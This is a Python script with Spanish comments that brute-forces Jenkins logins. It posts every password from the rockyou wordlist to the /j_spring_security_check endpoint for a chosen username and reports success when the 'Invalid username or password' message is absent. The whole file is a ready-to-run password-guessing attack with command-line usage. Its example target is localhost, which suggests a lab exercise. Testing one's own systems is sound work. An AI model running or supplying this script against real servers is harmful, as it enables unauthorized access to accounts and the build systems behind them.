import requests
import sys
from tqdm import tqdm

# Verifica si se pasaron los argumentos necesarios
def usage():
    print("Uso: python jenkins_brute_force.py <URL> <USUARIO>")
    print("Ejemplo: python jenkins_brute_force.py http://localhost:8080 feer248")

# Realiza el ataque de fuerza bruta
def brute_force(url, user, wordlist_file):
    session = requests.Session()

    # Abrir el archivo de contraseñas y calcular el número total de líneas
    with open(wordlist_file, "r", encoding="latin-1") as file:
        passwords = file.readlines()

    # Barra de progreso con tqdm
    progress_bar = tqdm(passwords, desc="Probando contraseñas", unit="intento", ncols=100)
    
    for password in progress_bar:
        password = password.strip()
        
        # Realiza la solicitud POST con los parámetros del formulario
        data = {
            "j_username": user,
            "j_password": password,
            "from": "/oops",
            "Submit": "Sign In"
        }

        try:
            response = session.post(url + "/j_spring_security_check", data=data)
            
            # Si encontramos el mensaje de error, significa que la contraseña es incorrecta
            if "Invalid username or password" in response.text:
                continue
            else:
                # Si la contraseña es correcta, detenemos la barra de progreso y mostramos el éxito
                progress_bar.close()
                print(f"\n\033[32m[ÉXITO] Contraseña encontrada: {password}\033[0m")  # Mensaje final con salto de línea
                break
        except requests.RequestException as e:
            print(f"Error al intentar con la contraseña {password}: {e}")
            continue

# Main
if __name__ == "__main__":

    # Comprobamos si se pasaron suficientes argumentos
    if len(sys.argv) < 3:
        usage()
        sys.exit(1)
    
    # Obtenemos los argumentos de la línea de comandos
    url = sys.argv[1]
    user = sys.argv[2]
    
    # Ruta del archivo de contraseñas (puedes modificarlo a tu gusto)
    wordlist_file = "/usr/share/wordlists/rockyou.txt"
    
    print(f"Iniciando ataque de fuerza bruta a {url} con el usuario {user}...\n")
    brute_force(url, user, wordlist_file)
